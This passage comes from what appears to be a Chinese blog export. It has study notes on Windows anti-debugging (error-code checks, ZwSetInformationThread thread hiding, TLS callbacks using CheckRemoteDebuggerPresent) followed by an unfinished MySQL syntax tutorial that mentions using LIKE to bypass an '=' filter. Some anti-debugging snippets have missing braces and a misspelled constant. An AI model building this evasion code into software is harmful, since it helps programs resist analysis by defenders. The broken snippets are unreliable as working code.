SetLastError(errorValue);      OutputDebugString("Test for debugger!");      if (GetLastError() == errorValue)          return TRUE;      return FALSE;  }BOOL CheckDebug1() {      char fib[1024] = {0};      DeleteFiber(fib);      return (GetLastError() != 0x57);  }  BOOL CheckDebug2()       DWORD ret = CloseHandle((HANDLE)0x1234);      if (ret != 0 || GetLastError() != RROR_INVALID_HANDLE) {         return TRUE;      return FALSE;}  BOOL CheckDebug3() {      DWORD ret = CloseWindow((HWND)0x1234);      if (ret != 0 || GetLastError() != ERROR_INVALID_WINDOW_HANDLE) {          return TRUE;       return FALSE;  }  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="ZwSetInformationThread"><a href="#ZwSetInformationThread" class="headerlink" title="ZwSetInformationThread"></a>ZwSetInformationThread</h5><p>ZwSetInformationThread拥有两个参数，</p><ul><li>第一个参数用来接收当前线程的句柄，第二个参数表示线程信息类型，若其值设置为ThreadHideFromDebugger(0x11)，使用语句ZwSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, NULL, 0);调用该函数后，调试进程就会被分离出来。</li><li>该函数不会对正常运行的程序产生任何影响，但若运行的是调试器程序，<strong>因为该函数隐藏了当前线程，调试器无法再收到该线程的调试事件，最终停止调试</strong>。还有一个函数DebugActiveProcessStop用来分离调试器和被调试进程，从而停止调试。两个API容易混淆，需要牢记它们的区别。</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">typedef enum _THREAD_INFORMATION_CLASS {       ThreadBasicInformation,       ThreadTimes,       ThreadPriority,       ThreadBasePriority,       ThreadAffinityMask,       ThreadImpersonationToken,       ThreadDescriptorTableEntry,       ThreadEnableAlignmentFaultFixup,       ThreadEventPair,       ThreadQuerySetWin32StartAddress,       ThreadZeroTlsCell,       ThreadPerformanceCount,       ThreadAmILastThread,       ThreadIdealProcessor,       ThreadPriorityBoost,       ThreadSetTlsArrayAddress,       ThreadIsIoPending,       ThreadHideFromDebugger           // 17 (0x11)   } THREAD_INFORMATION_CLASS, *PTHREAD_INFORMATION_CLASS;typedef NTSTATUS (WINAPI* ZWSETINFORMATIONTHREAD)(       HANDLE ThreadHandle,       THREAD_INFORMATION_CLASS ThreadInformationClass,       PVOID ThreadInformation,       ULONG ThreadInformationLength   );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ETC"><a href="#ETC" class="headerlink" title="ETC"></a>ETC</h4><h4 id="TLS回调函数"><a href="#TLS回调函数" class="headerlink" title="TLS回调函数"></a>TLS回调函数</h4><h5 id="TSL变量"><a href="#TSL变量" class="headerlink" title="TSL变量"></a>TSL变量</h5><p>TLS：Thread Local Storage即线程局部存储；TLS是一种<strong>方法</strong>，通过这种方法，给定多线程进程中的每个线程可以分配位置来<strong>存储特定于线程的数据</strong>。通过TLS API (TlsAlloc)支持**动态绑定(运行时)<strong>特定于线程的数据。Win32和Microsoft c++编译器现在除了现有的API实现外，还支持</strong>静态绑定(加载时)**每个线程数据。</p><p>​TLS主要是为了解决多线程中变量的<strong>同步</strong>问题，进程中的全局变量和函数内定义的静态(static)变量，是每个线程都可以访问的<strong>共享变量</strong>。只要有任何一个线程修改了共享变量，其他所有线程中的共享变量也会<strong>同步被修改</strong></p><p>​TLS变量即：同一个线程里面调用的各个函数都可以访问、但其他线程无法访问的变量（被称为static memory local to a thread 线程局部静态变量）</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">//TLS测试代码__declspec(thread) int global = 600; //声明TLS变量DWORD WINAPI threadFunc1(LPVOID parameter) {global = 666;std::cout &lt;&lt; "Thread1 global value set to " &lt;&lt; global &lt;&lt; std::endl;return 0;}DWORD WINAPI threadFunc2(LPVOID parameter) {Sleep(200); //等待200ms，使得线程1先输出完毕std::cout &lt;&lt; "Thread2 global value set to " &lt;&lt; global &lt;&lt; std::endl;return 0;}void TLSTest() {HANDLE hThread1 = CreateThread(NULL, NULL, threadFunc1, NULL, NULL, NULL);HANDLE hThread2 = CreateThread(NULL, NULL, threadFunc2, NULL, NULL, NULL);::WaitForSingleObject(hThread2, -1);::CloseHandle(hThread1);::CloseHandle(hThread2);system("pause");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从结果可以看出，全局变量在线程1中已经被修改为666，但是在线程2中依然为600；</p><p><img src="/2023/04/04/antibebug/3.png"></p><h5 id="TLS静态绑定"><a href="#TLS静态绑定" class="headerlink" title="TLS静态绑定"></a>TLS静态绑定</h5><p>TLS静态绑定主要体现在<strong>TLS回调函数</strong>上</p><ul><li><p>程序可以提供<strong>一个或多个</strong>TLS回调函数，以支持TLS数据对象的附加初始化和终止；</p></li><li><p>尽管通常只有一个回调函数，但回调函数是作为<strong>数组</strong>实现的，以便在需要时可以添加额外的回调函数；</p></li><li><p>如果有多个回调函数，则<strong>按其地址在数组中出现的顺序</strong>调用每个函数。<strong>空指针终止数组</strong>。空列表是完全有效的(不支持回调)，在这种情况下，回调数组只有一个成员—— null ptr（空指针）。</p></li></ul><p>使用TLS静态绑定三部曲：</p><ul><li><p>1）编译器声明使用TLS</p></li><li><p>2）定义TLS回调函数</p></li><li><p>3）注册TLS回调函数</p></li></ul><p>反调试原理：</p><ul><li>TLS回调函数: <strong>创建或终止某线程时,TLS函数会自动调用执行</strong></li><li>TLS函数在EP之前执行,因此可以将反调试的代码放在TLS回调函数里面</li></ul><p><strong>CheckRemoteDebuggerPresent() API</strong></p><ul><li>第一个参数，为要Check的进程的句柄；</li><li>第二个参数，为一个PBOOL，表示当前进程是否处于调试状态</li></ul><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">//TLS静态绑定//1、编译器声明使用TLS#ifdef _WIN64       //64位#pragma comment (linker, "/INCLUDE:_tls_used")  #pragma comment (linker, "/INCLUDE:tls_callback_func") #else               //32位#pragma comment (linker, "/INCLUDE:__tls_used") #pragma comment (linker, "/INCLUDE:_tls_callback_func")#endif//2、定义TLS回调函数void NTAPI tls_callback0(PVOID Dllhandle, DWORD Reason, PVOID Reserved) {BOOL ret;::CheckRemoteDebuggerPresent(::GetCurrentProcess(), &amp;ret);if (ret) {MessageBox(NULL, L"Funk You", L"TLS0AntiDebug", MB_OK);//::ExitProcess(0);}}void NTAPI tls_callback1(PVOID Dllhandle, DWORD Reason, PVOID Reserved) {BOOL ret;::CheckRemoteDebuggerPresent(::GetCurrentProcess(), &amp;ret);if (ret) {MessageBox(NULL, L"Funk You", L"TLS1AntiDebug", MB_OK);::ExitProcess(0);}}//3、注册TLS回调函数/*CRT表示使用C Runtime 机制X表示 标识名随机L表示 TLS Callback sectionF也可以替换成B~Y的任意一个字符*/#ifdef _WIN64                           //64位#pragma const_seg(".CRT$XLF")EXTERN_C const#else#pragma data_seg(".CRT$XLF")        //32位EXTERN_C#endifPIMAGE_TLS_CALLBACK tls_callback_func[] = { tls_callback0, tls_callback1, 0 }; //TLS回调函数数组，以NULL结尾。#ifdef _WIN64                           //64位#pragma const_seg()#else#pragma data_seg()                  //32位#endif //_WIN64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到程序会先依次执行TLS回调函数</p><p><img src="/2023/04/04/antibebug/5.png" alt="tls_callback0"></p><p><img src="/2023/04/04/antibebug/6.png" alt="tls_callback1"></p>]]></content>
      
      
      <categories>
          
          <category> 反调试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态反调试技术 </tag>
            
            <tag> TEB、PEB、TLS、反调试API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL语法</title>
      <link href="/2023/04/03/sql/"/>
      <url>/2023/04/03/sql/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h3 id="登录数据库"><a href="#登录数据库" class="headerlink" title="登录数据库"></a>登录数据库</h3><p>cmd命令行输入：</p><p>mysql -u username -p</p><p>or </p><p>mysql -u username -ppassword(这里-p要和你的密码紧靠在一起)</p><p><img src="/2023/04/03/sql/1.png" alt="1"></p><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><h4 id="创建数据库、表"><a href="#创建数据库、表" class="headerlink" title="创建数据库、表"></a>创建数据库、表</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">DATABASE</span> dbname<span class="token punctuation">;</span> <span class="token comment">#创建数据库</span><span class="token keyword">DROP</span> <span class="token keyword">DATABASE</span> dbname<span class="token punctuation">;</span>  <span class="token comment">#删除数据库</span><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> table_name； <span class="token comment">#删除表</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> table_name <span class="token comment">#创建数据库中的表</span><span class="token punctuation">(</span>column_name1 data_type<span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token punctuation">(</span>constraint_name<span class="token punctuation">)</span><span class="token punctuation">,</span>column_name2 data_type<span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token punctuation">(</span>constraint_name<span class="token punctuation">)</span><span class="token punctuation">,</span>column_name3 data_type<span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token punctuation">(</span>constraint_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>column_name：参数规定表中列的名称<span class="token punctuation">;</span>data_type：参数规定列的数据类型（例如 <span class="token keyword">varchar</span>、<span class="token keyword">integer</span>、<span class="token keyword">decimal</span>、<span class="token keyword">date</span> 等等）<span class="token punctuation">;</span>size：参数规定表中列的最大长度；constraint_name<span class="token punctuation">(</span>可选<span class="token punctuation">)</span>：约束名。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>约束(Constraints)</strong></p><p>SQL 约束用于规定表中的数据规则。如果存在违反约束的数据行为，行为会被约束终止。<strong>约束可以在创建表时规定（通过 CREATE TABLE 语句），或者在表创建之后规定（通过 ALTER TABLE 语句）</strong>。</p><p>在 SQL 中，我们有如下约束：</p><ul><li><strong>NOT NULL</strong> - 指示某列不能存储 NULL 值。</li><li><strong>UNIQUE</strong> - 保证某列的每行必须有唯一的值。</li><li><strong>PRIMARY KEY</strong> - NOT NULL 和 UNIQUE 的结合。确保某列（或两个列多个列的结合）有唯一标识，有助于更容易更快速地找到表中的一个特定的记录。</li><li><strong>FOREIGN KEY</strong> - 保证一个表中的数据匹配另一个表中的值的参照完整性。</li><li><strong>CHECK</strong> - 保证列中的值符合指定的条件。</li><li><strong>DEFAULT</strong> - 规定没有给列赋值时的默认值。</li></ul><h4 id="ALTER-待写"><a href="#ALTER-待写" class="headerlink" title="ALTER(待写)"></a>ALTER(待写)</h4><h4 id="DROP-待写"><a href="#DROP-待写" class="headerlink" title="DROP(待写)"></a>DROP(待写)</h4><p>注意：SQL语言中每条命令以<code>;</code>结尾；</p><p>show databases;   ==&gt;  展现所有数据库名</p><p>show tables;  ==&gt; 展现当前数据库的所有表名</p><p>use databaseName;  ==&gt; 使用databaseName数据库</p><p><img src="/2023/04/03/sql/2.png"></p><h3 id="数据查询语句"><a href="#数据查询语句" class="headerlink" title="数据查询语句"></a>数据查询语句</h3><h4 id="SELECT"><a href="#SELECT" class="headerlink" title="SELECT"></a>SELECT</h4><p>SELECT：用于从数据库中选取数据；</p><p>基本格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>column1, column2, …：要选择的字段名称，可以为多个字段。如果不指定字段名称或指定为<code>*</code>，则会选择所有字段;</li><li>table_name：要查询的表名称。</li></ul><p><img src="/2023/04/03/sql/3.png" alt="3"></p><h4 id="SELECT-DISTINCT"><a href="#SELECT-DISTINCT" class="headerlink" title="SELECT DISTINCT"></a>SELECT DISTINCT</h4><p>SELECT DISTINCT：用于返回唯一不同的值。</p><p>基本格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">DISTINCT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>**column1, column2, …**：要选择的字段名称，可以为多个字段。如果不指定字段名称或指定为<code>*</code>，则会选择所有字段;</li><li><strong>table_name</strong>：要查询的表名称。</li></ul><p>如下：去除了city列中的重复值；</p><p><img src="/2023/04/03/sql/4.png" alt="4"></p><p><strong>Note：</strong>若指定了多个column，则表示排除column都相等的；</p><h4 id="WHERE"><a href="#WHERE" class="headerlink" title="WHERE"></a>WHERE</h4><p>WHERE：该子句用于过滤记录；用于提取那些满足指定条件的记录。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token keyword">WHERE</span> condition<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>condition：指定的条件，可以用<code>AND/&amp;&amp;</code>或者<code>OR/||</code>连接多个条件，或在condition前加NOT表示否定;优先级：()&gt;not&gt;and&gt;or;</li><li>column，table_name解释如上SELECT;</li></ul><p><img src="/2023/04/03/sql/5.png" alt="5"></p><p><strong>Note：</strong>SQL 使用单引号<code>''</code>来环绕文本值(可双引号<code>""</code>)；如果是数值字段，请不要使用引号。</p><h5 id="可在where子句中使用的运算符"><a href="#可在where子句中使用的运算符" class="headerlink" title="可在where子句中使用的运算符"></a>可在where子句中使用的运算符</h5><table><thead><tr><th align="left">运算符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="left">=</td><td align="center">等于</td></tr><tr><td align="left">&lt;&gt;</td><td align="center">不等于。<strong>注释：</strong>在 SQL 的一些版本中，该操作符可被写成 !=</td></tr><tr><td align="left">&gt;</td><td align="center">大于</td></tr><tr><td align="left">&lt;</td><td align="center">小于</td></tr><tr><td align="left">&gt;=</td><td align="center">大于等于</td></tr><tr><td align="left">&lt;=</td><td align="center">小于等于</td></tr><tr><td align="left">BETWEEN</td><td align="center">在某个范围内</td></tr><tr><td align="left">LIKE</td><td align="center">搜索某种模式</td></tr><tr><td align="left">IN</td><td align="center">指定针对某个列的多个可能值</td></tr></tbody></table><h6 id="LIKE运算符"><a href="#LIKE运算符" class="headerlink" title="LIKE运算符"></a>LIKE运算符</h6><p>LIKE：该操作符用于在WHERE 子句中搜索列中的指定模式。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token keyword">WHERE</span> column_ <span class="token operator">LIKE</span> pattern<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>column_：要匹配的字段名称；</li><li>pattern：搜索模式。</li></ul><p><strong>通配符：</strong>可用于替代字符串中的任何其他字符。</p><table><thead><tr><th align="left">通配符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="left">%</td><td align="center">替代 0 个或多个字符</td></tr><tr><td align="left">_</td><td align="center">替代一个字符</td></tr><tr><td align="left">[<em>charlist</em>]</td><td align="center">字符列中的任何单一字符</td></tr><tr><td align="left">[^<em>charlist</em>] 或 [!<em>charlist</em>]</td><td align="center">不在字符列中的任何单一字符</td></tr></tbody></table><p><strong>LIKE 与 通配符 配合使用：</strong></p><p>当 like后面直接加具体的值(column like value)则相当于 column=vlaue，可以用来饶过<code>=</code>过滤；</p><p><img src="/2023/04/03/sql/8.png" alt="8"></p><p><strong>[charlist]通配符：</strong>MySQL 中使用 <strong>REGEXP</strong> 或 <strong>NOT REGEXP</strong> 运算符 (或 RLIKE 和 NOT RLIKE) 来操作正则表达式。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token keyword">WHERE</span> column_ <span class="token operator">REGEXP</span> pattern<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>column_：要匹配的字段名称；</li><li>pattern：正则表达式。</li></ul><p><img src="/2023/04/03/sql/9.png" alt="9"></p><h6 id="IN运算符"><a href="#IN运算符" class="headerlink" title="IN运算符"></a>IN运算符</h6><p>IN：该操作符允许您在 WHERE 子句中规定多个值。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token keyword">WHERE</span> column_ <span class="token operator">IN</span> <span class="token punctuation">(</span>value1<span class="token punctuation">,</span> value2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>column_：要匹配的字段名称；</li><li>value1, value2, …：要查询的值，可以为多个值。</li></ul><p><img src="/2023/04/03/sql/10.png" alt="10"></p><p>Note：其实就相当于 column_ = value1 || column_ = value2 || …</p><h6 id="BETWEEN运算符"><a href="#BETWEEN运算符" class="headerlink" title="BETWEEN运算符"></a>BETWEEN运算符</h6><p>BETWEEN：该操作符用于选取介于两个值之间的数据范围内的值。这些值可以是数值、文本或者日期。</p><p>格式：BETWEEN … AND ….</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token keyword">WHERE</span> column_ <span class="token operator">BETWEEN</span> value1 <span class="token operator">AND</span> value2<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>column_：要匹配的字段名称；</li><li>value1、value2：范围的起始值和结束值。</li></ul><p><img src="/2023/04/03/sql/6.png" alt="6"></p><p>Note：如果是文本的话，按照字符对应的数值依此比较；如下：</p><p><img src="/2023/04/03/sql/7.png" alt="7"></p><p><strong>Note：</strong></p><ul><li>在某些数据库中，BETWEEN 不包括两个测试值的字段；</li><li>在某些数据库中，BETWEEN 包括两个测试值的字段；</li><li>在某些数据库中，BETWEEN 包括第一个但不包括最后一个测试值的字段。</li></ul><p><strong>WHERE特殊使用情况：</strong></p><ul><li>直接 where 0(非0); 0时返回空，1时返回所有查询的列的值</li></ul><p><img src="/2023/04/03/sql/11.png" alt="11"></p><ul><li>空值判断：is null</li></ul><p>eg：select * from p where color is null; 查询color列中的空值。</p><h4 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h4><p>order by： 该关键字用于对结果集<strong>按照一个列或者多个列进行排序</strong>。默认按照升序排序。如果需要按照降序排序，可使用 DESC 关键字。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">ASC</span><span class="token operator">|</span><span class="token keyword">DESC</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>column1, column2, …：要排序的字段名称，column1全局排序，column2,…则是局部排序；</li><li>ASC：表示按升序排序；</li><li>DESC：表示按降序排序。</li></ul><p><img src="/2023/04/03/sql/12.png" alt="12"></p><p>可以看出：qty是降序的，而jno在qty相同的情况下是升序的</p><h4 id="LIMIT"><a href="#LIMIT" class="headerlink" title="LIMIT"></a>LIMIT</h4><p>LIMIT：用于规定要返回的记录的数目。</p><p>格式：（MySQL中</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">FROM</span> table_name<span class="token keyword">LIMIT</span> number<span class="token punctuation">;</span> <span class="token comment">#number为返回记录的数目</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/03/sql/16.png" alt="16"></p><h4 id="AS-SQL-别名"><a href="#AS-SQL-别名" class="headerlink" title="AS(SQL 别名)"></a>AS(SQL 别名)</h4><p>通过SQL，可以为表名称或列名称指定别名。 </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#列的 SQL 别名语法</span><span class="token keyword">SELECT</span> column_name <span class="token keyword">AS</span> alias_name<span class="token keyword">FROM</span> table_name<span class="token punctuation">;</span><span class="token comment">#表的 SQL 别名语法</span><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">FROM</span> table_name <span class="token keyword">AS</span> alias_name<span class="token punctuation">;</span><span class="token comment">#Note：如果列名称包含空格，要求使用双引号或方括号：</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在下面的情况下，使用别名很有用：</p><ul><li>在查询中涉及超过一个表</li><li>在查询中使用了函数</li><li>列名称很长或者可读性差</li><li>需要把两个列或者多个列结合在一起</li></ul><h4 id="JOIN"><a href="#JOIN" class="headerlink" title="JOIN"></a>JOIN</h4><p>JOIN ：用于把来自两个或多个表的行结合起来，基于这些表之间的<strong>共同字段</strong>。</p><p>在使用 <strong>join</strong> 时，<strong>on</strong> 和 <strong>where</strong> 条件的区别如下：</p><ul><li><strong>on</strong> 条件是在生成临时表时使用的条件，它不管 <strong>on</strong> 中的条件是否为真，都会返回左边表中的记录。</li><li><strong>where</strong> 条件是在临时表生成好后，再对临时表进行过滤的条件。这时已经没有 <strong>left join</strong> 的含义（必须返回左边表的记录）了，条件不为真的就全部过滤掉。</li></ul><p><strong>A inner join B</strong> 取交集；</p><p><strong>A left join B</strong> 取 A 全部，B 没有对应的值为 null；</p><p><strong>A right join B</strong> 取 B 全部 A 没有对应的值为 null；</p><p><strong>A full outer join B</strong> 取并集，彼此没有对应的值为 null。</p><h5 id="INNER-JOIN"><a href="#INNER-JOIN" class="headerlink" title="INNER JOIN"></a>INNER JOIN</h5><p>INNER JOIN：在表中存在至少一个匹配时返回行；等同于JOIN。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">FROM</span> table1<span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> table2<span class="token keyword">ON</span> table1<span class="token punctuation">.</span>column_name<span class="token operator">=</span>table2<span class="token punctuation">.</span>column_name<span class="token punctuation">;</span><span class="token operator">or</span><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">FROM</span> table1<span class="token keyword">JOIN</span> table2<span class="token keyword">ON</span> table1<span class="token punctuation">.</span>column_name<span class="token operator">=</span>table2<span class="token punctuation">.</span>column_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>column_name(s)：要显示的列名。</li><li>table1：表1的名称。</li><li>table2：表2的名称。</li><li>tablex.column_name：表中用于连接的列名。</li></ul><p><img src="/2023/04/03/sql/17.png" alt="17"></p><h5 id="LEFT-JOIN"><a href="#LEFT-JOIN" class="headerlink" title="LEFT JOIN"></a>LEFT JOIN</h5><p>LEFT JOIN：从左表（table1）返回所有的行，即使右表（table2）中没有匹配。如果右表中没有匹配，则结果为 NULL。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">FROM</span> table1<span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span> table2<span class="token keyword">ON</span> table1<span class="token punctuation">.</span>column_name<span class="token operator">=</span>table2<span class="token punctuation">.</span>column_name<span class="token punctuation">;</span><span class="token operator">or</span><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">FROM</span> table1<span class="token keyword">LEFT</span> <span class="token keyword">OUTER</span> <span class="token keyword">JOIN</span> table2<span class="token keyword">ON</span> table1<span class="token punctuation">.</span>column_name<span class="token operator">=</span>table2<span class="token punctuation">.</span>column_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/03/sql/18.png" alt="18"></p><h5 id="RIGHT-JOIN"><a href="#RIGHT-JOIN" class="headerlink" title="RIGHT JOIN"></a>RIGHT JOIN</h5><p>与LEFT JOIN相反，使用相同把left 改为 right即可。</p><h5 id="FULL-JOIN"><a href="#FULL-JOIN" class="headerlink" title="FULL JOIN"></a>FULL JOIN</h5><p>FULL OUTER JOIN：关键字只要左表（table1）和右表（table2）其中一个表中存在匹配，则返回行；结合了 LEFT JOIN 和 RIGHT JOIN 的结果。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">FROM</span> table1<span class="token keyword">FULL</span> <span class="token keyword">OUTER</span> <span class="token keyword">JOIN</span> table2<span class="token keyword">ON</span> table1<span class="token punctuation">.</span>column_name<span class="token operator">=</span>table2<span class="token punctuation">.</span>column_name<span class="token punctuation">;</span><span class="token operator">&gt;</span>_<span class="token operator">&lt;</span> 我电脑版本好像不支持<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="UNION"><a href="#UNION" class="headerlink" title="UNION"></a>UNION</h4><p>UNION：合并两个或多个 SELECT 语句的结果。</p><p><strong>Note：</strong>UNION 内部的每个 SELECT 语句必须拥有<strong>相同数量的列</strong>。列也必须拥有<strong>相似的数据类型</strong>。同时，每个 SELECT 语句中的<strong>列的顺序必须相同</strong>。</p><p>格式：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#UNION 操作符选取不同的值。如果允许重复的值，则使用UNION ALL；</span><span class="token comment">#UNION 结果集中的列名等于UNION中第一个 SELECT 语句中的列名。</span><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">FROM</span> table1<span class="token keyword">UNION</span><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">FROM</span> table2<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/03/sql/19.png" alt="19"></p><h3 id="数据更新语句"><a href="#数据更新语句" class="headerlink" title="数据更新语句"></a>数据更新语句</h3><h4 id="插入：INSERT-INTO语句"><a href="#插入：INSERT-INTO语句" class="headerlink" title="插入：INSERT INTO语句"></a>插入：INSERT INTO语句</h4><p>INSERT INTO：用于向表中插入新记录。</p><p>格式1 ：无需指定要插入数据的列名，只需提供被插入的值即可：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> table_name<span class="token 